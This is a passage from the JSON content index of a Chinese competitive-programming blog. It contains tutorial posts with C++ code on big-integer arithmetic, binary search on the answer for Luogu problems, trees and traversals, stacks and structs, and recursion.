num[i] = absn[absLen-i-1] - '0'; } return; } } a, b; // 输入的两个数 int c[INF+1]; // 结果 char cABS(){ // 字符串长度比较（字典序） if(a.absLen &gt; b.absLen || (a.absLen &gt;= b.absLen &amp;&amp; a.absn &gt; b.absn)){ return 'a'; } else if(a.absn == b.absn){ return '='; } else{ return 'b'; } } void add(){ // 加法函数 (a+b) for(int i=0; i&lt;max(a.len, b.len)+1; i++){ c[i] += a.num[i] + b.num[i]; c[i+1] += c[i] / 10; c[i] %= 10; } return; } void sub(){ // 减法函数 (a-b) for(int i=0; i&lt;max(a.len, b.len)+1; i++){ if(a.num[i] &lt; b.num[i]) c[i+1]--; c[i] += 10 - b.num[i] + a.num[i]; c[i] %= 10; } return; } void work(){ if(!a.neg &amp;&amp; !b.neg){ // 同号（正） add(); } else if(a.neg &amp;&amp; b.neg){ // 同号（负） cout &lt;&lt; &quot;-&quot;; add(); } else{ // 异号 char c = cABS(); if(c == '='){ // a=b，a-b=0 cout &lt;&lt; 0; return; } if(a.neg &amp;&amp; !b.neg){ // a负b正 if(c == 'a'){ // a的绝对值大于b的绝对值 cout &lt;&lt; &quot;-&quot;; sub(); } else{ // a的绝对值小于b的绝对值 swap(a, b); sub(); } } else{ // a正b负 if(c == 'a'){ // a的绝对值大于b的绝对值 sub(); } else{ // a的绝对值小于b的绝对值 cout &lt;&lt; &quot;-&quot;; swap(a, b); sub(); } } } int point = 0; // 高精度的输出 for(int i=max(a.len, b.len) + 1; i&gt;=0; i--){ if(c[i]){ point = i; break; } } for(int i=point; i&gt;=0; i--){ cout &lt;&lt; c[i]; } return; } int main(){ ios :: sync_with_stdio(false); a.inp(); b.inp(); work(); return 0; } ","tags":[{"index":-1,"name":"OI 系列","slug":"oi","used":true,"link":"https://daoxi365.github.io/tech-blog/oi/"}],"title":"高精度 AC Luogu P1001","feature":"https://daoxi365.github.io/tech-blog//post-images/gao-jing-du-ac-luogu-p1001.png","link":"https://daoxi365.github.io/tech-blog/gao-jing-du-ac-luogu-p1001/","stats":{"text":"3 min read","time":166000,"words":545,"minutes":3},"date":"2022-12-10 16:16:18","dateFormat":"2022-12-10"},{"content":"这大概是我第一次发绿题的题解吧…… 这道题我整了好几天，才过。 题面 &amp;\\&amp;&amp; 题解 如果单纯地思考怎么拿部分分，那这个题并不难，暴力模拟一遍就行了，小样例能过。 如果你要拿，那你就不能枚举了，需要二分降低时间复杂度。 我的老师说过：求最小值的最大值（最大值的最小值），跑不了二分答案。 因为起点和终点都有路标，所以我们可以确定出“空旷值”的范围啦（即下限为 000， 上限为 LLL）。我们在这期间开始二分答案每一个“空旷值”。 思考一下，二分答案的判断函数怎么写呢？ 我们可以从第一个路标枚举到最后一个路标，取两个路标的距离差。如果这个距离差大于midmidmid，那么我们就可以增加一个路标了。 为了进一步降低时间复杂度，我们可以使用小学数学来解决一下。我们可以知道： （图画的很丑，拿鼠标画的我尽力了） 考虑一种特殊情况，如果距离差刚好整除midmidmid，那么需要减去一。 我们用一个计数器cntcntcnt记录每一个距离差之间放的路标数量。我们可以根据cntcntcnt和最多放的路标数量KKK作比较，如果cnt&lt;=Kcnt&lt;=Kcnt&lt;=K返回真，反之返回假。 再说二分模板，我们可以根据checkcheckcheck函数的返回值来对应lll和rrr的变化。如果返回值为真，说明空旷值还可以进一步缩小；反之表示空旷值过小。 因此如果checkcheckcheck返回真，我们需要往左看；返回假，我们需要向右看。 由于最后是求最小值，所以需要输出左边界。 完整程序如下： // Author:PanDaoxi #include &lt;bits/stdc++.h&gt; using namespace std; const int INF = 1e5 + 1; int k, n, m, l, r, mid, a[INF]; bool check(int t){ int cnt = 0, now = 0; for(int i=1; i&lt;=n; i++){ /* 取两个路标之差x，cnt+=x/t 特判如果x%t为0，那么cnt-- */ now = a[i] - now; if(now &gt; t) cnt += now/t - (now%t == 0); now = a[i]; } if(cnt &lt;= m) return true; else return false; } int main(){ ios :: sync_with_stdio(false); cin &gt;&gt; k &gt;&gt; n &gt;&gt; m; for(int i=1; i&lt;=n; i++){ cin &gt;&gt; a[i]; } l = 0, r = k; while(l &lt;= r){ mid = (l+r) / 2; if(check(mid)){ r = mid - 1; } else{ l = mid + 1; } } cout &lt;&lt; l; return 0; } 拓展 Luogu P2678 跳石头 类比于《路标设置》的思想，刚才的那道题是枚举空旷指数，这个题是枚举跳跃距离。思考一下，得到以下程序： // Author:PanDaoxi #include &lt;bits/stdc++.h&gt; #define int long long using namespace std; const int INF = 5e4 + 1; int k, m, n, l, r, mid, a[INF]; bool check(int t){ int cnt = 0, now = 0; for(int i=1; i&lt;=n; i++){ if(a[i] - now &gt;= t) now = a[i]; else cnt++; } if(k - now &lt; t){ cnt++; } if(cnt &lt;= m) return true; else return false; } signed main(){ ios :: sync_with_stdio(false); cin &gt;&gt; k &gt;&gt; n &gt;&gt; m; l = 1, r = k; for(int i=1; i&lt;=n; i++){ cin &gt;&gt; a[i]; } while(l &lt;= r){ mid = (l+r) / 2; if(check(mid)){ l = mid + 1; } else{ r = mid - 1; } } cout &lt;&lt; r; return 0; } 题外话 预祝全天下OIerOIerOIer们程序员节快乐！ 我去年102410241024来的洛谷，到今天快一年了。 一年前我还啥也不是，现在已经可以开始挑战难题了（部分是跟着老师做的） 由于今年的形势（学校那边的七天小长假不好请），我决定不参加CSP2022CSP2022CSP2022，再努力一年，明年再战。 OIerOIerOIer们加油啊！祝全天下OIerOIerOIer能取得好成绩！ ","tags":[{"index":-1,"name":"OI 系列","slug":"oi","used":true,"link":"https://daoxi365.github.io/tech-blog/oi/"}],"title":"Luogu P3853 路标设置","feature":"https://daoxi365.github.io/tech-blog//post-images/luogu-p3853-lu-biao-she-zhi.png","link":"https://daoxi365.github.io/tech-blog/luogu-p3853-lu-biao-she-zhi/","stats":{"text":"4 min read","time":232000,"words":916,"minutes":4},"date":"2022-10-22 09:14:10","dateFormat":"2022-10-22"},{"content":" 分享笑话一则：洛谷神图 树是啥？不就是树吗？ 实际上，我们今天所说的树，是一种数据结构。 它叫做树形结构，实际上长这样： 树 今天的概念比较多，也很繁杂，大家看看就行，没必要完全记住，只要知道大概的意思即可。 对于树，大家见得比较多的是思维导图。其实这是一种树。 还有目录树。比如下面这个（这是我自己开发的一款小软件)： D:. │ db.sqlite3 │ main.py │ manage.py │ README.md │ TTS_config │ ├─About │ │ 依赖包安装工具.bat │ │ │ └─Update │ EMERGENCY.md │ README.md │ ├─Client │ Client.py │ VERSION │ └─VeryControl │ asgi.py │ settings.py │ urls.py │ VERSION │ wsgi.py │ __init__.py │ └─__pycache__ settings.cpython-36.pyc urls.cpython-36.pyc wsgi.cpython-36.pyc __init__.cpython-36.pyc 我们将其抽象化，就形成了树形结构。 树的概念 结点 我们将以这棵树为例来讲解下面的几个概念。 注意别写错字，是“结点”而非“节点”。 像上图中那样，A, B, CA,\\ B,\\ CA, B, C 等都称作结点。 其中，一棵树最开始的分支，比如上图中的结点 AAA，叫做根结点。 注意嗷，有些结点下面的分支还指向其他的结点（例如结点 BBB），那么我们称分支下来的结点为孩子（如结点 E, F, GE,\\ F,\\ GE, F, G）； 如果站在结点 EEE 的角度看结点 BBB，则称结点 BBB 为结点 EEE 的双亲，结点 A, BA,\\ BA, B 是结点 EEE 的祖先；反之，如果我站在根节点看下面的所有结点，那么称这些结点为子孙结点。 同一结点的孩子结点，我们称这些结点为兄弟；不同结点但是层数相同的孩子结点，我们称这些结点为堂兄弟。 我们知道，每一个结点都可能有孩子结点。如果有一个结点没有孩子结点，那么我们称这个结点为叶子结点。 度、层数、高度、子树 对于任意一个结点，度指这个结点有几个孩子结点。 例如下面这棵树，结点 EEE 的度为 222；结点 AAA 的度为 333。 那么，对于一棵树的度，指各个子结点的度的最大值。例如上面的那棵树的度就为 333，因为 AAA 结点有 333 个孩子结点。 层数很好理解，比如说 EEE 在第一层，A, FA,\\ FA, F 在第二层， B, C, D, K, LB,\\ C,\\ D,\\ K,\\ LB, C, D, K, L 在第三层…… 高度指某棵树的最大延伸长度。这棵树的高度为 333，因为它延伸了 333 层。 子树是什么？子树其实就是某棵树的一部分。例如： 其中画黑框的就是整棵树的一个子树。 独根树、满树、完全树 独根树应该不难理解吧：这棵树只有一个结点，即根结点。 满树，即一棵树的所有结点（除了最后一层的叶子结点）的度均相等。 例如，这就是一棵满树，它的度数为 222： 完全树：完全树是指从根节点开始，由上至下，从左到右，一个个地给结点标号。直到标到最后的的叶子结点。如果某一编号的结点与满树的位置相同，则这是一棵完全树。 如下图，这是一棵完全树。 有没有感觉太恐怖了？！ 至于最优二叉树（哈夫曼树)、红黑树、二叉平衡树、对称二叉树等，我们以后再讲。 二叉树 恭喜你，你已经完成一半的任务了。 我们来看看二叉树。 先说二叉树是什么：二叉树是度为 222 的树。 二叉树是比较特殊的一种树。它大概长这样： 其中，一个度为 222 的结点，它的两个孩子结点分别叫做左孩子、右孩子。 遍历 学二叉树，我们跑不了二叉树遍历。 二叉树遍历主要分 333 种，分别是： 先序遍历 中序遍历 后序遍历 这三种遍历，我们来看看如何实现吧！ 先序遍历 先序遍历的口诀是“根左右”，意为先遍历根节点，然后是以左孩子为根节点遍历子树，直到叶子结点再回溯遍历右孩子结点的子树。 我们看到了“回溯”，应该能想起来点什么吧？ ——递归。 // Author:PanDaoxi #include &lt;bits/stdc++.h&gt; using namespace std; map &lt;char, string&gt; tree; // 映射字典，我们可以通过一个字符来获取它的左右孩子 int n; void f(char root){ if(root == '*') return; // 跳出递归 cout &lt;&lt; root; // 输出根节点 f(tree[root][0]); // 遍历以左孩子为根节点的子树 f(tree[root][1]); // 遍历以右孩子为根节点的子树 } int main(){ char root; cin &gt;&gt; n; for(int i=1; i&lt;=n; i++){ char a, b, c; cin &gt;&gt; a &gt;&gt; b &gt;&gt; c; if(i == 1) root = a; // 记录整棵树的根节点 tree[a] = string(1, b) + string(1, c); // 字符串拼接 } f(root); // 从整棵树的根节点开始递归遍历 return 0; } 中序遍历 同样的道理，但是中序遍历的口诀是“左根右”。即先访问左孩子，再访问根结点，最后是右孩子。 // Author:PanDaoxi #include &lt;bits/stdc++.h&gt; using namespace std; map &lt;char, string&gt; tree; // 映射字典，我们可以通过一个字符来获取它的左右孩子 int n; void f(char root){ if(root == '*') return; // 跳出递归 f(tree[root][0]); // 遍历以左孩子为根节点的子树 cout &lt;&lt; root; // 输出根节点 f(tree[root][1]); // 遍历以右孩子为根节点的子树 } int main(){ char root; cin &gt;&gt; n; for(int i=1; i&lt;=n; i++){ char a, b, c; cin &gt;&gt; a &gt;&gt; b &gt;&gt; c; if(i == 1) root = a; // 记录整棵树的根节点 tree[a] = string(1, b) + string(1, c); // 字符串拼接 } f(root); // 从整棵树的根节点开始递归遍历 return 0; } 以这棵树为例，我们从最左边开始，遍历顺序为： A -&gt; B -&gt; D -&gt; B -&gt; E -&gt; A -&gt; C - - - - - 所以遍历结果为 DBECADBECADBECA。 后序遍历 后序遍历的口诀为“左右根”，即最后输出根节点。 // Author:PanDaoxi #include &lt;bits/stdc++.h&gt; using namespace std; map &lt;char, string&gt; tree; // 映射字典，我们可以通过一个字符来获取它的左右孩子 int n; void f(char root){ if(root == '*') return; // 跳出递归 f(tree[root][0]); // 遍历以左孩子为根节点的子树 f(tree[root][1]); // 遍历以右孩子为根节点的子树 cout &lt;&lt; root; // 输出根节点 } int main(){ char root; cin &gt;&gt; n; for(int i=1; i&lt;=n; i++){ char a, b, c; cin &gt;&gt; a &gt;&gt; b &gt;&gt; c; if(i == 1) root = a; // 记录整棵树的根节点 tree[a] = string(1, b) + string(1, c); // 字符串拼接 } f(root); // 从整棵树的根节点开始递归遍历 return 0; } 同样是这棵树，那么遍历顺序应该是： A -&gt; B -&gt; D -&gt; E -&gt; B -&gt; C -&gt; A - - - - - 所以遍历结果为 DEBCADEBCADEBCA。 拓展 放几道稍难点的题，给大家看。 给出中序、后序遍历求先序遍历 首先，单单给出中序或后序是求不出来二叉树的，因为有不同的形态。但是先序和中序同时出现而且合法，就能求出唯一二叉树。 这个题目的切入点是什么？ ——后序遍历。后序遍历的最后一位，永远是二叉树的根节点。 找到根节点以后干嘛呢？中序遍历里面，根节点前面的全都是第二层左孩子的子树，后面全都是第二层右孩子的子树。 // Author:PanDaoxi #include &lt;bits/stdc++.h&gt; using namespace std; void f(string s1, string s2){ if(!s1.size()) return; char c = s2[s2.size()-1]; cout &lt;&lt; c; int t = s1.find(c); // 找到中序遍历里面根的下标 f(s1.substr(0, t), s2.substr(0, t)); // 遍历左子树 f(s1.substr(t+1), s2.substr(t, s2.size()-t-1)); } int main(){ string a, b; cin &gt;&gt; a &gt;&gt; b; f(a, b); return 0; } 给出先序、中序遍历，求后序遍历 切入点就是，先序遍历的第一个字符即为二叉树的根结点。 // Author:PanDaoxi #include &lt;bits/stdc++.h&gt; using namespace std; void f(string s1, string s2){ if(!s2.size()) return; char c = s2[0]; int t = s1.find(c); f(s1.substr(0, t), s2.substr(1, t)); f(s1.substr(t+1), s2.substr(t+1)); cout &lt;&lt; c; } int main(){ string a, b; cin &gt;&gt; a &gt;&gt; b; f(a, b); return 0; } ","tags":[{"index":2,"name":"OI 从入门到出门","slug":"oier-yyds","used":true,"link":"https://daoxi365.github.io/tech-blog/oier-yyds/"},{"index":-1,"name":"OI 系列","slug":"oi","used":true,"link":"https://daoxi365.github.io/tech-blog/oi/"}],"title":"八、树形数据结构","feature":"https://daoxi365.github.io/tech-blog//post-images/shu-xing-jie-gou.png","link":"https://daoxi365.github.io/tech-blog/shu-xing-jie-gou/","stats":{"text":"9 min read","time":516000,"words":2116,"minutes":9},"date":"2022-09-25 09:37:06","dateFormat":"2022-09-25"},{"content":" 分享笑话一则：我翻到了以前我写的程序，在洛谷上存着： 大概是我自己弄了半天然后 ACACAC 了，这么激动。 栈这个东西，大家肯定都听说过，那咱们再跳过一次？ 不管怎么样，我们还得再说说。 栈 我们的 C++C++C++ 有一个大杀器—— STLSTLSTL 模板库。 我们可以使用万能头文件，然后用下面这行代码创建一个栈： // 创建一个整数类型的栈 s stack &lt;int&gt; s; 创建这个栈以后，我们先看一个神奇的东西——结构体。 结构体 结构体允许用户创建自己的数据类型，方便使用。我们可以用 structstructstruct 创建结构体。 // main 外 struct hhh{ // 变量，各种类型 int a; char b; bool c; long long d; double e; int f[114]; short g[514]; string h; // 函数 void read(){ cin &gt;&gt; a &gt;&gt; b; } // 其他各种内容都可以塞进来 }; // 注意有分号！ // 创建一个hhh类型的数组 hhh qwp[11]; // 创建一个hhh类型的变量 hhh abc; int main(){ abc.read(); for(int i=1; i&lt;=10; i++) qwp[i].read(); // ... return 0; } 结构体数组支持 sortsortsort 函数排序。 /* 用法： sort(数组名+起始下标, 数组名+终止下标, 自定义的排序函数); */ struct ha{ int a, b; } bool cmp(ha x, ha y){ // 返回 x 大于 y 的情况 if(x.a != y.a) return x.a &gt; y.a; else return x.b &gt; y.b; } int main(){ ha a[5]; for(int i=1; i&lt;=5; i++){ cin &gt;&gt; a[i].a &gt;&gt; a[i].b; } sort(a+1, a+6, cmp); // 其实那玩意儿叫地址，但是太麻烦了，我们后面再说 for(int i=1; i&lt;=5; i++){ cout &lt;&lt; a[i].a &lt;&lt; &quot; &quot; &lt;&lt; a[i].b; } } 提高组考这大水题有点儿过分了啊 我们来一起看看这个题，这是我初学的时候写的程序： // Author:PanDaoxi #include &lt;bits/stdc++.h&gt; using namespace std; struct stu { string name=&quot;&quot;; int s1=0, s2=0, s3=0, total=0; char t1=0, t2=0; void work() { if(s1 &gt; 80 &amp;&amp; s3 &gt; 0) total += 8000; if(s1 &gt; 85 &amp;&amp; s2 &gt; 80) total += 4000; if(s1 &gt; 90) total += 2000; if(s1 &gt; 85 &amp;&amp; t2 == 'Y') total += 1000; if(s2 &gt; 80 &amp;&amp; t1 == 'Y') total += 850; } } s[101]; // 简略写法，表示直接创建一个数组 int main() { int n; cin &gt;&gt; n; for(int i=0; i&lt;n; i++) cin &gt;&gt; s[i].name &gt;&gt; s[i].s1 &gt;&gt; s[i].s2 &gt;&gt; s[i].t1 &gt;&gt; s[i].t2 &gt;&gt; s[i].s3; string name = &quot;&quot;; int tot1=0, tot2=0; for(int i=0; i&lt;n; i++) { s[i].work(); tot2 += s[i].total; if(s[i].total &gt; tot1) tot1 = s[i].total, name = s[i].name; } cout &lt;&lt; name &lt;&lt; endl &lt;&lt; tot1 &lt;&lt; endl &lt;&lt; tot2; return 0; } 模拟栈 栈是一种线性数据结构，你也可以想成就是一条很窄的路，元素只能一个一个过。 如果这条路的一头“咔”，堵死了，那这就是一个栈。 你看，就是这样的： 那么，我要弹出一个元素，肯定是要先弹出栈顶咯。这也是一个栈的基本概念：先进后出。 “噗”，元素 EEE 出去了，栈顶变成了 DDD 。 ButButBut ，咱们可爱的小电脑怎么知道这个操作呢？ ——我们需要一个指针 ppp （其实也就是变量，不是那种指针），指向栈顶元素的下标，弹出时这个指针自减；进入时，这个指针自增；如果按照这个思路，那么栈中一共有 p+1p+1p+1 个元素。 按照上面的思路，我们可以写出栈的模拟： // Author:PanDaoxi #include &lt;bits/stdc++.h&gt; using namespace std; const int inf = 114514; struct stack_int{ // 栈顶指针、模拟数组 int t = 0, st[inf]; // 函数 void push(int k){ // 压入栈顶 st[t++] = k; } void pop(){ // 踢出栈顶 st[t--] = 0; } bool empty(){ // 判空 return t &lt;= 0; } int size(){ return t; } int top(){ if(!empty()) return st[t-1]; else return INT_MAX; // 传回一个错误值 } }; int main(){ stack_int st; // 创建一个栈 st.push(191); // 压入114 st.push(9810); // 压入9810 st.push(114514); // 压入114514 printf(&quot;踢出前长度：%d\\n&quot;, st.size()); st.pop(); printf(&quot;踢出后栈顶：%d\\n&quot;, st.top()); printf(&quot;踢出后长度：%d\\n&quot;, st.size()); st.pop(); st.pop(); printf(&quot;踢出两个元素后长度：%d\\n&quot;, st.size()); printf(&quot;判断栈是否为空：%s&quot;, (st.empty() ? &quot;Yes&quot; : &quot;No&quot;)); return 0; } 大杀器 STLSTLSTL 我们可以使用模板库简化刚才的例子。 // Author:PanDaoxi #include &lt;bits/stdc++.h&gt; using namespace std; stack &lt;int&gt; st; // 创建一个栈 int main(){ st.push(191); // 压入114 st.push(9810); // 压入9810 st.push(114514); // 压入114514 printf(&quot;踢出前长度：%d\\n&quot;, st.size()); st.pop(); printf(&quot;踢出后栈顶：%d\\n&quot;, st.top()); printf(&quot;踢出后长度：%d\\n&quot;, st.size()); st.pop(); st.pop(); printf(&quot;踢出两个元素后长度：%d\\n&quot;, st.size()); printf(&quot;判断栈是否为空：%s&quot;, (st.empty() ? &quot;Yes&quot; : &quot;No&quot;)); return 0; } 练习 其实这个题直接暴力模拟也是可以的。我初学 C++C++C++ 那会儿写的程序也没用栈： #include &lt;iostream&gt; using namespace std; int main(){ string x; int a = 0; cin &gt;&gt; x; for(int i=0; i&lt;x.size(); i++){ if(x[i] == '(') a++; if(x[i] == ')') a--; if(a &lt; 0){ cout &lt;&lt; &quot;NO&quot;; return 0; } } cout &lt;&lt; (a ? &quot;NO&quot; : &quot;YES&quot;); return 0; } 下面放出标准答案： // Author:PanDaoxi #include &lt;bits/stdc++.h&gt; using namespace std; stack &lt;char&gt; st; int main(){ char c; while(cin &gt;&gt; c){ if(c == '@') break; if(st.empty() &amp;&amp; c == ')'){ // 特判 cout &lt;&lt; &quot;NO&quot;; return 0; } if(c == '(') st.push(c); if(c == ')') st.pop(); } cout &lt;&lt; (st.empty() ? &quot;YES&quot; : &quot;NO&quot;); return 0; } 这真的是老师讲的例题！直接模拟，胆大心细就行。 // Author:PanDaoxi #include &lt;bits/stdc++.h&gt; using namespace std; stack&lt;unsigned long long&gt; st; int main(){ int T; cin &gt;&gt; T; for(int j=0; j&lt;T; j++){ unsigned long long n, m; string s; cin &gt;&gt; n; for(int i=0; i&lt;n; i++){ cin &gt;&gt; s; if(s == &quot;push&quot;){ cin &gt;&gt; m; st.push(m); } else if(s == &quot;pop&quot;){ if(st.empty()) cout &lt;&lt; &quot;Empty&quot; &lt;&lt; endl; else st.pop(); } else if(s == &quot;size&quot;) cout &lt;&lt; st.size() &lt;&lt; endl; else if(s == &quot;query&quot;){ if(st.empty()) cout &lt;&lt; &quot;Anguei!&quot; &lt;&lt; endl; else cout &lt;&lt; st.top() &lt;&lt; endl; } } while(!st.empty()) st.pop(); } return 0; } 先说最简单的模拟思路，我们输入一个字符串，从头开始遍历。 如果当前字符为数字，往临时字符串里储存。 如果遇到点，把字符串整成数往栈里存。 如果是符号，拿出来栈顶的两个元素计算结果（那两个元素 poppoppop 掉），然后再 pushpushpush 进栈。 最后输出栈顶。 // Author:PanDaoxi #include &lt;bits/stdc++.h&gt; using namespace std; stack &lt;int&gt; st; int sti(string s){ int n = 0; for(int i=0; i&lt;s.size(); i++){ n = 10*n + (s[i]-'0'); } return n; } int main(){ string s, temp=&quot;&quot;; cin &gt;&gt; s; for(int i=0; i&lt;s.size(); i++){ if(s[i] == '@') break; if('0' &lt;= s[i] &amp;&amp; s[i] &lt;= '9'){ temp += s[i]; } if(s[i] == '.'){ st.push(sti(temp)); temp = &quot;&quot;; } if(s[i] == '+'){ int x = st.top(); st.pop(); int y = st.top(); st.pop(); st.push(x + y); } else if(s[i] == '-'){ int x = st.top(); st.pop(); int y = st.top(); st.pop(); // 前面的减后面的 st.push(y - x); } else if(s[i] == '*'){ int x = st.top(); st.pop(); int y = st.top(); st.pop(); st.push(x * y); } else if(s[i] == '/'){ int x = st.top(); st.pop(); int y = st.top(); st.pop(); st.push(y / x); } } cout &lt;&lt; st.top(); return 0; } ","tags":[{"index":2,"name":"OI 从入门到出门","slug":"oier-yyds","used":true,"link":"https://daoxi365.github.io/tech-blog/oier-yyds/"},{"index":-1,"name":"OI 系列","slug":"oi","used":true,"link":"https://daoxi365.github.io/tech-blog/oi/"}],"title":"七、栈","feature":"https://daoxi365.github.io/tech-blog//post-images/zhan-oi.png","link":"https://daoxi365.github.io/tech-blog/zhan-oi/","stats":{"text":"9 min read","time":536000,"words":1820,"minutes":9},"date":"2022-09-12 10:19:21","dateFormat":"2022-09-12"},{"content":" 分享笑话一则：凌乱之美。 从今天开始，我们就要初涉算法，请大家做好心理准备嗷！ 函数 先说说什么是函数。 大家眼里的函数，可能是这个样的： 哈，多么美妙的图案！ 实际上，在计算机里，函数是这个样的： 当然，如果复杂一点点，是这样的： 我们以前写的 mainmainmain 函数，也是一个函数（废话，那必须的啊），你可以按照 mainmainmain 的写法，写出一个函数： 类型名 函数名(类型1 参数1, 类型2 参数2, ……){ // 也可以不要参数 你在函数内要做的事儿 return 返回的类型; // 必须与函数开头那个一样 } 如果不需要返回值，你可以声明 voidvoidvoid 类型的函数。 // Author:PanDaoxi #include &lt;bits/stdc++.h&gt; using namespace std; int c, p, q; void hahaha(int a, int b){ c = a+b; return; // 退出函数 c = 0; // 不会执行 } int main(){ cin &gt;&gt; p &gt;&gt; q; hahaha(p, q); cout &lt;&lt; c; return 0; } 但你如何退出整个程序呢？exit(0)exit(0)exit(0) 。 // Author:PanDaoxi #include &lt;bits/stdc++.h&gt; using namespace std; int c, p, q; void hahaha(int a, int b){ c = a+b; exit(0); } int main(){ cin &gt;&gt; p &gt;&gt; q; hahaha(p, q); cout &lt;&lt; c; return 0; } 所以程序不会输出。 递归 递归这个名词大家估计都耳熟能详吧，那咱们跳过吧 但是我们还是要好好学习递归的，因为递归对于我们后面学习深搜、二叉树是非常重要的。 如果你还没听说过递归，那么我告诉你，你可以把递归理解成一种特殊的循环。还记得小时候听过的“老和尚讲故事”吗？讲来讲去，你就陷入了循环，自己讲起了我自己。 // Author:PanDaoxi #include &lt;bits/stdc++.h&gt; using namespace std; void story(){ cout &lt;&lt; &quot;从前有座山，山上有座庙。庙里有个老和尚给小和尚讲故事，讲的是什么呢？&quot; &lt;&lt; endl; story(); // 我自己执行我自己 } int main(){ story(); return 0; } 然后你会发现，控制台上输出了非常多的故事，直到你把它关掉，这就类似于死循环，我们称这种递归叫做无穷递归。 前段时间我们说 whilewhilewhile 循环的时候，那个括号里的表达式就是循环条件。如果不满足循环条件， whilewhilewhile 循环就会结束，然后继续运行后面的指令。所以我们想让递归结束，必须要设置边界条件，这样就能实现有穷递归。 比如说，我们刚才讲故事的例子，如果我们想让程序输出 101010 遍，那么该怎么写？ // Author:PanDaoxi #include &lt;bits/stdc++.h&gt; using namespace std; void story(int k){ // k 表示故事讲了k遍 if(k &gt; 10){ // 讲了10遍以上 printf(&quot;故事讲完啦&quot;); return; // 退出递归 } printf(&quot;第%d遍：从前有座山，山上有座庙。庙里有个老和尚给小和尚讲故事，讲的是什么呢？\\n&quot;, k); story(k+1); // 讲了一遍故事 } int main(){ story(1); // 从第一遍开始讲故事 return 0; } 当然你也可以自由地控制递归次数，要多上机尝试、练习。 我们来做个题儿应用一下吧： 这个题其实用循环也能过，官方给的标签也是循环结构，但是我喜欢用递归解。 程序也并不难，如下： 回溯 可能有的小伙伴一听“回溯”，就吓得不轻：难道你要给我讲深搜？ 其实递归的回溯并不难好叭，大家模拟一下就可以咯。 请你阅读以下这个程序，告诉我，结果会输出多少？ // Author:PanDaoxi #include &lt;bits/stdc++.h&gt; using namespace std; void f(int k){ if(k &gt; 5) return; printf(&quot;%d &quot;, k); f(k+1); printf(&quot;%d &quot;, k); } int main(){ f(1); return 0; } 答案是： 1 2 3 4 5 5 4 3 2 1 为什么会这样？我们来模拟一下。 最开始，主函数调用给进函数的参数 k=1k=1k=1。进来以后走流程： 判断：kkk 如果大于 555 就退出。 输出当前 kkk 的值； 递归 kkk 增加 111。 递归到边界时，输出 kkk 的值。 可见如果递归到 k=5k=5k=5 时程序先输出，后面程序尝试递归 k=6k=6k=6 发现：诶，k&gt;5k&gt;5k&gt;5 了，该退出递归了！ 退出了递归 k=6k=6k=6，程序继续执行当前层数（k=5k=5k=5）的后面的命令，输出了 555，然后 k=5k=5k=5 的递归结束，继续进行 k=4k=4k=4 的递归…… 长此以往， 运行到 k=1k=1k=1 时（又回到了主程序给定的 kkk 的值时），递归结束。 利用这个特点，我给你出一道题吧。 【角谷猜想的过程】 现在，给你一个数，要求你把角谷猜想（就是上面那个）的过程展现出来。 例如： 输入 111，应该输出：1。 输入 555，应该输出：((1)*2)*2+1。 输入 123123123，应该输出：((((((1)*2+1)*2+1)*2+1)*2)*2+1)*2+1。 输入114514114514114514，应该输出：((((((((((((((((1)*2+1)*2)*2+1)*2+1)*2+1)*2+1)*2+1)*2+1)*2)*2+1)*2)*2+1)*2)*2)*2+1)*2。 输入 191918019191801919180，应该输出：((((((((((((((((((((1)*2+1)*2+1)*2)*2+1)*2)*2+1)*2)*2)*2+1)*2)*2)*2)*2+1)*2+1)*2)*2)*2+1)*2+1)*2)*2。 不信你可以把它还原回去，还是原来那个数。 这个程序，我们可以这么写： // Author:PanDaoxi #include &lt;bits/stdc++.h&gt; using namespace std; void f(int k){ if(k == 1){ cout &lt;&lt; 1; return; } cout &lt;&lt; &quot;(&quot;; bool flag = k&amp;1; f(flag ? ((k-1)/2) : (k/2)); cout &lt;&lt; &quot;)*2&quot;; if(flag) cout &lt;&lt; &quot;+1&quot;; } int main(){ int n; cin &gt;&gt; n; f(n); return 0; } 做俩简单的题儿： // Author:PanDaoxi #include &lt;bits/stdc++.h&gt; using namespace std; double f(double x, int n){ if(n == 1) return sqrt(1.0 + x); return sqrt(n + f(x, --n)); } int main(){ double x; int n; cin &gt;&gt; x &gt;&gt; n; cout &lt;&lt; fixed &lt;&lt; setprecision(2) &lt;&lt; f(x, n); return 0; } // Author:PanDaoxi #include &lt;bits/stdc++.h&gt; using namespace std; double f(double x, int n){ if(n == 1) return x / (1.0+x); return x / (n + f(x, --n)); } int main(){ double x; int n; cin &gt;&gt; x &gt;&gt; n; cout &lt;&lt; fixed &lt;&lt; setprecision(2) &lt;&lt; f(x, n); return 0; } 好啦好啦，后面我们就要趁热打铁学深搜了！ 我目前的规划是： 递归 深搜 排序 贪心 递推 栈和队列 二分 广搜 动态规划 ………… ","tags":[{"index":2,"name":"OI 从入门到出门","slug":"oier-yyds","used":true,"link":"https://daoxi365.github.io/tech-blog/oier-yyds/"},{"index":-1,"name":"OI 系列","slug":"oi","used":true,"link":"https://daoxi365.github.io/tech-blog/oi/"}],"title":"六、递归","feature":"https://daoxi365.github.io/tech-blog//post-images/di-gui-OI.png","link":"https://daoxi365.github.io/tech-blog/di-gui-OI/","stats":{"text":"7 min read","time":416000,"words":1615,"minutes":7},"date":"2022-09-10 10:23:51","dateFormat":"2022-09-10"},{"content":"高精度 今天我们就说一件事：高精度。 高精度是什么玩意儿？ 什么是高精度高精度算法？高精度算法属于处理大数字的数学计算方法。在一般的科学计算中，会经常算到小数点后几百位或者更多，当然也可能是几千亿几百亿的大数字。一般这类数字我们统称为高精度数，高精度算法是用计算机对于超大数据的一种模拟加，减，乘，除。 好家伙，合着今天讲数学？ 没错，我们今天直接梦回一年级，思考底层的加减乘除、四则运算。 数据类型的极大值、极小值 首先，在讲高精度以前，我们先来认识一下比较常见的几种类型的最大值、最小值。 最大值： int类型：2147483647 char类型：127 short类型：32767 long类型：2147483647 long long类型：9223372036854775807 signed char类型：127 unsigned char类型：255 unsigned short类型：65535 unsigned int类型：4294967295 unsigned long类型：4294967295 unsigned long long类型：18446744073709551615 最小值： char类型：-128 short类型：-32768 int类型：-2147483648 long类型：-2147483648 long long类型：-9223372036854775808 unsigned char类型：-128 大家没必要记，看看就OK了，有个大概的概念就行。 加法 加法这个事儿，大家肯定都很熟悉吧？ 不是，我是说也许。 现在，我们来看看如何加。 很多人最开始一见到这个题，很高兴啊，“太简单了！我直接用long long”，然后就悲剧了。 我们想啊，题中给了一个条件： 那它肯定、肯定是不能使用常规的手法储存的，它的最大长度（501位)为远远超过 long long 